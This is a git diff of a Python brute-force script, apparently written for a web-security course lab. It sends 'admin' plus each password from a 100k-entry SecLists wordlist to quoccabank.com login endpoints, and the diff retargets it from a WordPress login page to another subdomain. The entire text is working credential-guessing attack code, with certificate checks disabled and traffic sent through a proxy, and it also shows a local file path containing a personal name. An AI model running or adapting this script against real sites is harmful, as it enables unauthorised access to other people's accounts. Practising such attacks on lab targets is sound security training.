@@ -11,21 +11,20 @@ flags = []
 
 def send_password(password):
     #Request payload takes login and password
-    payload = {'log': 'admin', 'pwd': password}
-    r = requests.post('https://blog.quoccabank.com/wp-login.php', data=payload, verify=False, proxies=proxies)
+    payload = {'user': 'admin', 'pass': password}
+    r = requests.post('https://logmeout.quoccabank.com/', data=payload, verify=False, proxies=proxies)
     
     print("Trying " + password)
-
+    # print(re.search('None', r.text))
     #Check if the HTML response has this text
-    if(re.search('Error', r.text) == None):
+    if(re.search('None', r.text) != None):
         print("Found at " + password )
         return
     return r
 
 #Passwords file
-passwords = open('../Seclists/100k_passwords.txt', 'r')
+passwords = open('/Users/ravijamaheshwari/Documents/csGitRepos/WebSecurity/SecLists/100k_pass.txt', 'r')
 
 for line in passwords:
     stripped_line = line.strip()
     r = send_password(stripped_line)
-    r.close()
